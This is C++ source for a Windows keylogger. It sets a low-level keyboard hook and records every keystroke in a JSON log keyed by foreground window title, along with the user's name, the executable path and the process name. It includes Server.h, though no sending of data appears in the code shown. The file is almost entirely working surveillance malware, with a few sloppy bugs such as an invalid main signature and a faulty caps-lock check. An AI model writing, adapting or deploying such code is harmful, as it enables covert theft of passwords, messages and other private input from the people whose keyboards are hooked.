#include "Server.h"
#include "Configuration.h"
#include "Log.h"
#include <json/json.h>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <Lmcons.h>
#include <thread>
#include <map>

#define MAX_PATH 256

string getCurrentDate()
{
	time_t t = time(0);   // get time now
	char buffer[80];
	struct tm * now = localtime(&t);

	strftime(buffer, sizeof(buffer), "%d-%m-%Y %H:%M:%S", now);
	return (buffer);
}

Json::Value _root;
string date = getCurrentDate();

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	string char_string;
	char exe_name[MAX_PATH + 1], username[UNLEN + 1], wndw_title[MAX_PATH], *path;

	int last_key_code = '\0';
	DWORD childpid, username_len = UNLEN + 1;
	HANDLE window_proc;
	HWND hwnd = GetForegroundWindow(); // Gets a handler for the current window

	GetWindowThreadProcessId(hwnd, &childpid);
	memset(exe_name, 0, sizeof(exe_name));
	window_proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, childpid);
	GetWindowText(hwnd, wndw_title, sizeof(wndw_title));
	GetModuleFileNameEx(window_proc, NULL, exe_name, MAX_PATH);
	cout << GetLastError() << endl;
	GetUserName(username, &username_len);
	CloseHandle(window_proc);

	_root[wndw_title]["Date"] = date;
	if (_root.isMember(wndw_title))
	{
		if (!_root[wndw_title].isMember("User")) { _root[wndw_title]["User"] = username; }
		if (!_root[wndw_title].isMember("Path")) { _root[wndw_title]["Path"] = exe_name; }
		if (!_root[wndw_title].isMember("Process name")) {
			_root[wndw_title]["Process name"] 
			  = string(exe_name).substr(string(exe_name).find_last_of('\\') + 1,
				string(exe_name).length() - 1); }
	}

	cout << endl;
	// If key is being pressed
	if (wParam == WM_KEYDOWN) {

		last_key_code = p->vkCode;
		switch (p->vkCode) {

		case VK_CAPITAL:	_root[wndw_title]["Keystrokes"].append("[CAPLOCK] ");	break;
		case VK_LSHIFT:																break;
		case VK_RSHIFT:																break;
		case VK_LCONTROL:	_root[wndw_title]["Keystrokes"].append("[LCTRL]");		break;
		case VK_RCONTROL:	_root[wndw_title]["Keystrokes"].append("[RCTRL]");		break;
		case VK_LWIN:		_root[wndw_title]["Keystrokes"].append("[LWIN]");		break;
		case VK_RWIN:		_root[wndw_title]["Keystrokes"].append("[RWIN]");		break;
		case VK_NUMPAD0:	_root[wndw_title]["Keystrokes"].append("[0]");			break;
		case VK_NUMPAD1:	_root[wndw_title]["Keystrokes"].append("[1]");			break;
		case VK_NUMPAD2:	_root[wndw_title]["Keystrokes"].append("[2]");			break;
		case VK_NUMPAD3:	_root[wndw_title]["Keystrokes"].append("[3]");			break;
		case VK_NUMPAD4:	_root[wndw_title]["Keystrokes"].append("[4]");			break;
		case VK_NUMPAD5:	_root[wndw_title]["Keystrokes"].append("[5]");			break;
		case VK_NUMPAD6:	_root[wndw_title]["Keystrokes"].append("[6]");			break;
		case VK_NUMPAD7:	_root[wndw_title]["Keystrokes"].append("[7]");			break;
		case VK_NUMPAD8:	_root[wndw_title]["Keystrokes"].append("[8]");			break;
		case VK_NUMPAD9:	_root[wndw_title]["Keystrokes"].append("[9]");			break;
		case VK_DIVIDE:		_root[wndw_title]["Keystrokes"].append("[/]");			break;
		case VK_MULTIPLY:	_root[wndw_title]["Keystrokes"].append("[*]");			break;
		case VK_ADD:		_root[wndw_title]["Keystrokes"].append("[+]");			break;
		case VK_SUBTRACT:	_root[wndw_title]["Keystrokes"].append("[-]");			break;
		case VK_SPACE:		_root[wndw_title]["Keystrokes"].append(" ");			break;
		case VK_SNAPSHOT:	_root[wndw_title]["Keystrokes"].append("[PRTSCRN]");	break;
		case VK_INSERT:		_root[wndw_title]["Keystrokes"].append("[INSERT]");		break;
		case VK_END:		_root[wndw_title]["Keystrokes"].append("[END]");		break;
		case VK_PRINT:		_root[wndw_title]["Keystrokes"].append("[PRINT]");		break;
		case VK_DELETE:		_root[wndw_title]["Keystrokes"].append("[DEL]");		break;
		case VK_BACK:		_root[wndw_title]["Keystrokes"].append("[BK]");		break;
		case VK_LMENU:		_root[wndw_title]["Keystrokes"].append("[LALT]");		break;
		case VK_RMENU:		_root[wndw_title]["Keystrokes"].append("[RALT]");		break;
		case VK_TAB:		_root[wndw_title]["Keystrokes"].append("[TAB]");		break;
		case VK_RETURN:		_root[wndw_title]["Keystrokes"].append("[ENTER]");		break;
		case VK_OEM_1:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append(":"); }
			else { _root[wndw_title]["Keystrokes"].append(";"); }
			break;
		case VK_OEM_2:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("?"); }
			else { _root[wndw_title]["Keystrokes"].append("/"); }
			break;
		case VK_OEM_3:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("~"); }
			else { _root[wndw_title]["Keystrokes"].append("`"); }
			break;
		case VK_OEM_4:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("{"); }
			else { _root[wndw_title]["Keystrokes"].append("["); }
			break;
		case VK_OEM_5:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("|"); }
			else { _root[wndw_title]["Keystrokes"].append("\\"); }
			break;
		case VK_OEM_6:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("}"); }
			else { _root[wndw_title]["Keystrokes"].append("]"); }
			break;
		case VK_OEM_7:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("\""); }
			else { _root[wndw_title]["Keystrokes"].append("'"); }
			break;
		case VK_OEM_8:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("?"); }
			else { _root[wndw_title]["Keystrokes"].append("/"); }
			break;
		case VK_OEM_COMMA:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("<"); }
			else { _root[wndw_title]["Keystrokes"].append(","); }
			break;
		case VK_OEM_PERIOD:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append(">"); }
			else { _root[wndw_title]["Keystrokes"].append("."); }
			break;
		case VK_OEM_MINUS:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("_"); }
			else { _root[wndw_title]["Keystrokes"].append("-"); }
			break;
		case VK_OEM_PLUS:
			if (GetAsyncKeyState(VK_SHIFT)) { _root[wndw_title]["Keystrokes"].append("+"); }
			else { _root[wndw_title]["Keystrokes"].append("="); }
			break;

		default:
			if (GetKeyState(VK_CAPITAL) & 0x0001 != 0)
			{
				_root[wndw_title]["Keystrokes"].append(string(1, (char)(p->vkCode)));
				cout << "CAPS" << endl;
			}
			else if (GetAsyncKeyState(VK_SHIFT) & (1 << 16))
			{
				cout << "SHIFT" << endl;
				if (p->vkCode == 48) { _root[wndw_title]["Keystrokes"].append(")"); }
				else if (p->vkCode == 49) { _root[wndw_title]["Keystrokes"].append("!"); }
				else if (p->vkCode == 50) { _root[wndw_title]["Keystrokes"].append("@"); }
				else if (p->vkCode == 51) { _root[wndw_title]["Keystrokes"].append("#"); }
				else if (p->vkCode == 52) { _root[wndw_title]["Keystrokes"].append("$"); }
				else if (p->vkCode == 53) { _root[wndw_title]["Keystrokes"].append("%"); }
				else if (p->vkCode == 54) { _root[wndw_title]["Keystrokes"].append("^"); }
				else if (p->vkCode == 55) { _root[wndw_title]["Keystrokes"].append("&"); }
				else if (p->vkCode == 56) { _root[wndw_title]["Keystrokes"].append("*"); }
				else if (p->vkCode == 57) { _root[wndw_title]["Keystrokes"].append("("); }
				else { _root[wndw_title]["Keystrokes"].append(string(1, (char)(p->vkCode))); }
			}
			else { _root[wndw_title]["Keystrokes"].append(string(1, (char)(p->vkCode + 32))); }
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(string logfile_location, int duration = 0)
{
	//Set windows hook
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyboardProc,
		NULL,
		0);

	Sleep(1000); // pause for 1 second
	cout << "---------] Keylogger initialized" << endl;
	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);

	cout << _root << endl;
	system("pause");
	UnhookWindowsHookEx(keyboardHook);
	exit(0);
}
